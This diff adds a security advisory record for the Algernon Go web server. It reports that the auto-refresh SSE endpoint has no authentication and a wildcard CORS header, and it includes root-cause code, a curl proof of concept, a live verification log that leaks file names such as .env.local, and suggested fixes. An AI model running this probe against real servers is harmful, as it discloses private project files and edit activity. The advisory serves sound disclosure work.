@@ -1,0 +1,43 @@
+{
+  "id": "GHSA-9v4j-7g44-qcqw",
+  "modified": "2026-05-19T14:45:16.286370889Z",
+  "published": "2026-05-19T14:36:34Z",
+  "summary": "Algernon: Auto-refresh SSE event server binds to all interfaces with Access-Control-Allow-Origin: * and no authentication",
+  "details": "### Summary\n\nWhen auto-refresh is enabled, Algernon spins up an SSE handler that streams a `data:` line for every filesystem event under the watched directory. The handler performs **no authentication** of any kind — no shared token, no cookie check against the `permissions2` userstate, no IP allow-list, no path-prefix permission. Any client that can complete a TCP connection to the listener address receives the stream.\n\nThis advisory covers the authentication gap in isolation. The cross-origin browser-reach (advisory #2b) and the network-reach (advisory #2c) amplify the impact, but each is independently fixable; this finding addresses the case where a same-origin or LAN-local client connects directly to the SSE port and reads the stream without proving anything about its identity.\n\n### Details\n\n#### Root cause — the SSE handler does not consult `permissions2` or any other auth\n\n```go\n// vendor/github.com/xyproto/recwatch/eventserver.go:100-144  (1.17.6)\nfunc GenFileChangeEvents(events TimeEventMap, mut *sync.Mutex, maxAge time.Duration, allowed string) http.HandlerFunc {\n    return func(w http.ResponseWriter, _ *http.Request) {\n        w.Header().Set(\"Content-Type\", \"text/event-stream;charset=utf-8\")\n        w.Header().Set(\"Cache-Control\", \"no-cache\")\n        w.Header().Set(\"Connection\", \"keep-alive\")\n        w.Header().Set(\"Access-Control-Allow-Origin\", allowed)\n        // ... loop emits one SSE record per filename touched ...\n    }\n}\n```\n\nNote the handler signature: `func(w http.ResponseWriter, _ *http.Request)`. The request is discarded — no `Cookie`, `Authorization`, query-string, or remote-IP check is performed before the stream begins.\n\nIn 1.17.6 the listener was placed on its own `http.ServeMux` ([recwatch/eventserver.go:200-215](../vendor/github.com/xyproto/recwatch/eventserver.go)), wholly outside the `perm.Rejected` middleware chain that gates Algernon's main HTTP listener. Even an operator who had configured admin/user path prefixes via `perm.AddAdminPath`, set a `cookieSecret`, and forced authentication on every URL of the main server had no way to gate this listener — it was unreachable from the `mux` argument the perm middleware uses.\n\n#### Why authentication matters for this listener\n\nThe stream contents are not public data. They reveal:\n\n- Which files the developer is actively editing, with sub-second timing precision.\n- The existence of files inside the watched root (including files the operator may have meant to keep private — `.env.local`, `secrets.lua`, in-progress draft files).\n- By inference, the directory layout of the project.\n\nA client that can connect to the listener obtains a low-rate continuous information disclosure for the lifetime of the connection. The handler is an infinite `for {}` loop — there is no natural session boundary or expiry.\n\n#### Source-level evidence\n\n```text\n$ rg -n 'GenFileChangeEvents|EventServer\\(' vendor/github.com/xyproto/recwatch/\nvendor/github.com/xyproto/recwatch/eventserver.go:101:func GenFileChangeEvents(events TimeEventMap, mut *sync.Mutex, maxAge time.Duration, allowed string) http.HandlerFunc {\nvendor/github.com/xyproto/recwatch/eventserver.go:177:func EventServer(path, allowed, eventAddr, eventPath string, refreshDuration time.Duration) {\n\n$ rg -n 'Cookie|Authorization|Token|state\\.User' vendor/github.com/xyproto/recwatch/eventserver.go\n# zero matches — no authentication primitive is referenced anywhere in the file\n```\n\n### PoC (against 1.17.6)\n\n```bash\n# 1. Operator runs algernon with auto-refresh on a project directory:\nalgernon -a /path/to/project   # spins up :5553 on Linux/macOS, localhost:5553 on Windows\n\n# 2. Any client that can reach the listener connects without credentials:\ncurl -sN http://\u003cserver\u003e:5553/sse\n# =\u003e id: 0\n#    data: /path/to/project/secret-notes.md\n#\n#    id: 1\n#    data: /path/to/project/.env.local\n```\n\nNo `Cookie`, no `Authorization`, no `X-Token`, no preflight, no challenge. The connection succeeds and the stream is delivered for as long as the client keeps the socket open.\n\n### Impact\n\n- **Confidentiality:** medium. Continuous information disclosure of filenames and edit timing to anyone who can connect.\n- **Integrity:** none.\n- **Availability:** low. Each connection consumes a goroutine indefinitely; many simultaneous connections can exhaust descriptors.\n\n### Suggestions to fix\n\n**Primary fix — require a shared secret on the SSE endpoint.** The auto-refresh feature already injects a script into served HTML ([engine/sse.go:118-165](../engine/sse.go)); that script knows the SSE URL. Add a per-startup token, embed it in the injected JS, and require it on the SSE request:\n\n```go\n// engine/sse.go -- in InsertAutoRefresh\ntmplData.SessionToken = ac.sseToken    // generated once at startup, e.g. crypto/rand 32 bytes\n\n// JS:\n//   var source = new EventSource('...?token={{.SessionToken}}');\n\n// recwatch handler:\n//   if subtle.ConstantTimeCompare([]byte(r.URL.Query().Get(\"token\")),\n//                                 []byte(serverToken)) != 1 {\n//       http.Error(w, \"forbidden\", http.StatusForbidden); return\n//   }\n```\n\nCookie-bearing requests work too if `recwatch.EventServer` is moved behind `perm.Rejected` (see \"Defence in depth\"). The token approach is the smaller change.\n\n**Defence in depth — mount the SSE handler on the main mux.** Moving `recwatch.EventServerHandler` onto the main `http.ServeMux` automatically places the SSE handler behind whatever middleware the operator has configured — `perm.Rejected`, `tollbooth`, custom auth wrappers. This closes the same-origin half of the gap without a per-token implementation. Any dedicated-port path bypasses `perm.Rejected` because it uses its own `http.ServeMux`, and that path needs the token fix from \"Primary fix\" above.\n\n### Live verification\n\n```\n$ ./algernon.exe --nodb --httponly --server -a --addr 127.0.0.1:18781 --quiet poc2/site\n$ ( curl -sN --max-time 4 http://127.0.0.1:5553/sse \u003e stream.txt \u0026\n    sleep 1\n    echo \"edit-1\" \u003e\u003e poc2/site/secret-notes.md\n    echo \"edit-2\" \u003e\u003e poc2/site/.env.local\n    wait )\n$ cat stream.txt\nid: 0\ndata: C:\\Users\\xbox\\Desktop\\VulnTesting\\algernon-main\\poc-test\\poc2\\site\\secret-notes.md\n\nid: 1\ndata: C:\\Users\\xbox\\Desktop\\VulnTesting\\algernon-main\\poc-test\\poc2\\site\\.env.local\n```\n\nNo `Cookie`, no `Authorization` header. Stream delivered.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/xyproto/algernon",
+        "purl": "pkg:golang/github.com/xyproto/algernon"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.17.7"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 1.17.6",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-9v4j-7g44-qcqw/GHSA-9v4j-7g44-qcqw.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/xyproto/algernon/security/advisories/GHSA-9v4j-7g44-qcqw"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/xyproto/algernon"
+    }
+  ]
+}
